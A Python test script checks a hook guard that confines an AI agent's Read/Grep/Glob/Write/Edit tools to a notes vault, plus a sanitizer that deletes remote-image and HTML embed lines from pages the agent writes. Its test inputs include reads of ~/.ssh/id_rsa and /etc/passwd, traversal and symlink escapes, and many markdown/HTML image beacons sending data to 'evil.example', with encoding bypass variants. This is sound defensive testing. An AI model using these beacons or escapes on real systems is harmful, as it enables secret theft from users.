#!/usr/bin/env python3
"""Checks the PreToolUse guard denies what it must. Run it directly: python3 scripts/test_ingest_path_guard.py"""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

GUARD = Path(__file__).parent / "ingest-path-guard.py"


def call(tool_input, roots, tool="Read", write=()):
    """Returns the permissionDecision, or None when the guard stayed silent (allow).
    write: the write roots, passed as the guard's arguments the way guard_settings() does."""
    env = {**os.environ, "REKALL_GUARD_ROOTS": os.pathsep.join(str(r) for r in roots)}
    if roots is None:
        env.pop("REKALL_GUARD_ROOTS", None)
    out = subprocess.run(
        [sys.executable, str(GUARD), *map(str, write)],
        input=json.dumps({"tool_name": tool, "tool_input": tool_input}),
        capture_output=True, text=True, env=env,
    )
    assert out.returncode == 0, f"guard must exit 0, got {out.returncode}: {out.stderr}"
    if not out.stdout.strip():
        return None
    return json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"]


def main():
    with tempfile.TemporaryDirectory() as tmp:
        vault = Path(tmp) / "vault"
        (vault / "wiki").mkdir(parents=True)
        inside = vault / "wiki" / "note.md"
        inside.write_text("x")
        roots = [vault]

        assert call({"file_path": str(inside)}, roots) is None, "a file in the vault must be allowed"
        assert call({"file_path": str(vault)}, roots) is None, "the root itself must be allowed"
        assert call({"file_path": str(Path.home() / ".ssh" / "id_rsa")}, roots) == "deny", "~/.ssh must be denied"
        assert call({"file_path": "/etc/passwd"}, roots) == "deny", "/etc must be denied"
        assert call({"file_path": str(vault) + "/../secret.env"}, roots) == "deny", "traversal out must be denied"

        # A symlink planted inside the vault must not become a way out of it.
        link = vault / "wiki" / "escape"
        link.symlink_to(Path(tmp) / "outside.txt")
        (Path(tmp) / "outside.txt").write_text("secret")
        assert call({"file_path": str(link)}, roots) == "deny", "symlink out of the vault must be denied"

        # Grep and Glob carry their path under `path`, and Write/Edit under `file_path`.
        assert call({"path": "/etc"}, roots, tool="Grep") == "deny", "Grep outside must be denied"
        assert call({"path": str(vault)}, roots, tool="Glob") is None, "Glob inside must be allowed"
        assert call({"file_path": "/tmp/evil.md"}, roots, tool="Write") == "deny", "Write outside must be denied"

        # A pathless Grep searches cwd (the vault root, .obsidian/ included), so it is refused.
        assert call({"pattern": "TODO"}, roots, tool="Grep") == "deny", "a pathless Grep must be denied"

        # Misconfiguration fails closed rather than open.
        assert call({"file_path": str(inside)}, []) == "deny", "an empty allowlist must deny"

        # A second root is honored, since ingest also reads the wiki skill.
        other = Path(tmp) / "skills"
        other.mkdir()
        assert call({"file_path": str(other / "SKILL.md")}, [vault, other]) is None, "a second root must be allowed"

        # Write/Edit only under VAULT/wiki, never CLAUDE.md, never a dot path; other roots read-only.
        roots2, wiki = [vault, other], [vault / "wiki"]
        plugin = vault / ".obsidian" / "plugins" / "x" / "main.js"
        assert call({"file_path": str(plugin)}, roots2, tool="Write", write=wiki) == "deny", ".obsidian plugin write must be denied"
        assert call({"file_path": str(plugin)}, roots2, tool="Read", write=wiki) == "deny", "dot paths are denied for reads too"
        assert call({"file_path": str(vault / ".claude" / "settings.json")}, roots2, tool="Edit", write=wiki) == "deny"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Write", write=wiki) == "deny", "wiki/CLAUDE.md write must be denied"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Edit", write=wiki) == "deny", "wiki/CLAUDE.md edit must be denied"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Read", write=wiki) is None, "reading wiki/CLAUDE.md must be allowed"
        assert call({"file_path": str(vault / "wiki" / "pages" / "x.md")}, roots2, tool="Write", write=wiki) is None, "a wiki page write must be allowed"
        assert call({"file_path": str(vault / "notes.md")}, roots2, tool="Write", write=wiki) == "deny", "a vault write outside wiki/ must be denied"
        assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Write", write=wiki) == "deny", "the skill root must be read-only"
        assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Read", write=wiki) is None, "reading the skill root must be allowed"
        assert call({"file_path": str(inside)}, roots2, tool="Write") == "deny", "no write roots means no writes"
        # APFS is case-insensitive, so the CLAUDE.md block must be too; ingest writes markdown only.
        assert call({"file_path": str(vault / "wiki" / "claude.md")}, roots2, tool="Write", write=wiki) == "deny", "wiki/claude.md must be denied"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.local.md")}, roots2, tool="Edit", write=wiki) == "deny"
        assert call({"file_path": str(vault / "wiki" / "x.canvas")}, roots2, tool="Write", write=wiki) == "deny", "a .canvas write must be denied"
        assert call({"file_path": str(vault / "wiki" / "x.html")}, roots2, tool="Edit", write=wiki) == "deny", "an .html write must be denied"
        assert call({"file_path": str(vault / "wiki" / "pages" / "x.MD")}, roots2, tool="Write", write=wiki) is None, "suffix check ignores case"
        # Grep reads hidden files, so Glob and Grep need a path under wiki/ or the skill root.
        w = str(vault / "wiki")
        assert call({"pattern": "x"}, roots2, tool="Grep", write=wiki) == "deny", "Grep with no path"
        assert call({"pattern": "x", "path": str(vault)}, roots2, tool="Grep", write=wiki) == "deny", "Grep path=VAULT"
        assert call({"pattern": "x", "path": w}, roots2, tool="Grep", write=wiki) is None, "Grep path=VAULT/wiki"
        assert call({"pattern": "*.md", "path": str(other)}, roots2, tool="Glob", write=wiki) is None, "Glob path=skill root"
        assert call({"pattern": "*.md", "path": str(vault / ".obsidian")}, roots2, tool="Glob", write=wiki) == "deny"
        # Globs: narrow alphabet, relative, no dot folders.
        for g in ("**/[.]obsidian/**", "[.]obsidian/**", "?obsidian/**", "/Users/x/**", "**/{.obsidian,pages}/**",
                  ".obsidian/**/*.js", "~/x/*", "pages\\*.md", "!(x)"):
            assert call({"pattern": g, "path": w}, roots2, tool="Glob", write=wiki) == "deny", f"Glob {g}"
            assert call({"pattern": "x", "glob": g, "path": w}, roots2, tool="Grep", write=wiki) == "deny", f"Grep glob {g}"
        for g in ("pages/**/*.md", "**/*.md", "{pages,meetings}/*.md"):
            assert call({"pattern": g, "path": w}, roots2, tool="Glob", write=wiki) is None, f"Glob {g}"
            assert call({"pattern": "x", "glob": g, "path": w}, roots2, tool="Grep", write=wiki) is None, f"Grep glob {g}"
        assert call({"pattern": "[.]obsidian|\\?", "path": w}, roots2, tool="Grep", write=wiki) is None, "Grep's pattern is a regex"

    check_settings()
    print("ingest path guard: all checks pass")


def check_settings():
    """The pipeline's own guard_settings() must produce settings that name this guard."""
    import importlib.util
    import tempfile as _tf
    root = Path(__file__).resolve().parents[1]
    with _tf.TemporaryDirectory() as tmp:
        vault = Path(tmp) / "vault"
        (vault / "wiki").mkdir(parents=True)
        cfg = Path(tmp) / "rekall.toml"
        cfg.write_text(
            '[user]\nname = "T"\ntimezone = "America/Chicago"\n'
            f'[vault]\npath = "{vault}"\n'
            f'[data]\npath = "{tmp}/data"\nstate = "{tmp}/state"\n'
            '[wiki]\narchive = "archive"\n[monday]\nboard = 0\ngroup = "Auto-Capture"\n')
        os.environ["REKALL_CONFIG"] = str(cfg)
        sys.path.insert(0, str(root))
        spec = importlib.util.spec_from_file_location("_fp", root / "scripts" / "fathom-pipeline.py")
        fp = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(fp)

        settings, roots = fp.guard_settings()
        hook = json.loads(settings)["hooks"]["PreToolUse"][0]
        for tool in ("Read", "Glob", "Grep", "Write", "Edit"):
            assert tool in hook["matcher"], f"{tool} must be matched by the guard hook"
        assert "ingest-path-guard.py" in hook["hooks"][0]["command"], "the hook must invoke this guard"
        assert str(vault) in roots, "the vault must be an allowed root"
        assert ".claude/skills/wiki" in roots or "skills/wiki" in roots, \
            "the wiki skill dir must be an allowed root; ingest is told to read it"
        assert f'"{vault / "wiki"}"' in hook["hooks"][0]["command"], "VAULT/wiki must be the only write root"

        check_strip_images(fp, vault)


def check_strip_images(fp, vault):
    """Embed-capable lines (raw HTML, a non-local image, a reference definition) are deleted from
    the wiki pages the child wrote; plain links, local embeds and ordinary text stay; paths
    outside wiki/ are ignored."""
    page = vault / "wiki" / "pages" / "p.md"
    page.parent.mkdir(parents=True, exist_ok=True)
    outside = vault / "notes.md"
    outside.write_text("![x](https://evil.example/outside.png)\n")
    bypasses = [
        "![beacon](https://evil.example/?d=secret)",
        "![a [nested] alt](https://evil.example/nested)",
        "![escaped \\] bracket](https://evil.example/escaped)",
        "![bs](http\\s\\://evil.example/backslashed)",
        "![ent](&#104;ttps://evil.example/entity)",
        "![proto](//evil.example/proto)",
        "![ref][r1] uses a definition",
        "[r1]: https://evil.example/ref.png",
        '<img alt="a > b" src="https://evil.example/q.gif">',
        "<IMG SRC='//evil.example/y'>",
        '<img srcset="https://evil.example/s.png 2x">',
        '<video poster="https://evil.example/p.jpg"></video>',
        '<iframe src="https://evil.example/frame"></iframe>',
        '<audio src="https://evil.example/a.mp3"></audio>',
        '<source src="https://evil.example/s.webm">',
        '<embed src="https://evil.example/e.swf">',
        "```",
        "![in a fence](https://evil.example/fenced)",
        "```",
        "<img",                                   # tag split across lines: the opening line goes
        "![a](",                                  # target on the next line: the opening line goes
        '<img src="https&colon;\\\\evil.example\\x">',
        '![l](assets/a.png "note: x")',          # a titled local image is lost, accepted
        "![unc](\\\\evil.example\\share\\x.png)",  # a UNC path is a network fetch on Windows
        "[Q3]: target: 10%",                     # any reference definition goes
        "[r2]:",
        "    https://evil.example/next-line.png",
    ]
    keep = ["# P", "![l](assets/a.png)", "Keep ![[local.png]] and ![[b.png|200]] too.",
            "[see](https://e/x)", "```md", "no tag or image in this fence", "```",
            "a < b and x<3 stay", "tail"]
    page.write_text("\n".join(keep[:1] + bypasses + keep[1:]) + "\n")
    events = [json.dumps({"type": "assistant", "message": {"content": [
        {"type": "tool_use", "name": "Write", "input": {"file_path": "wiki/pages/p.md", "content": "..."}},
        {"type": "tool_use", "name": "Write", "input": {"file_path": "notes.md", "content": "..."}},
        {"type": "tool_use", "name": "Edit", "input": {"file_path": str(vault / "wiki" / "CLAUDE.md")}},
        {"type": "tool_use", "name": "Write", "input": {"file_path": "wiki/x.canvas"}},
        {"type": "tool_use", "name": "Read", "input": {"file_path": "wiki/other.md"}}]}})]
    written = [p for e in events for p in fp.written_paths(e)]
    assert written == [page.resolve()], f"only .md wiki pages the child wrote count: {written}"
    fp.strip_remote_images(written)
    lines = page.read_text().splitlines()
    for b in bypasses:
        if b != "```":
            assert b not in lines, f"must be deleted: {b!r}"
    assert "evil" not in "\n".join(l for l in lines if "![" in l or "<" in l), lines
    for k in keep:
        assert k in lines, f"kept line lost: {k!r}"
    assert "evil" in outside.read_text(), "a path outside wiki/ is ignored and its file untouched"


if __name__ == "__main__":
    main()
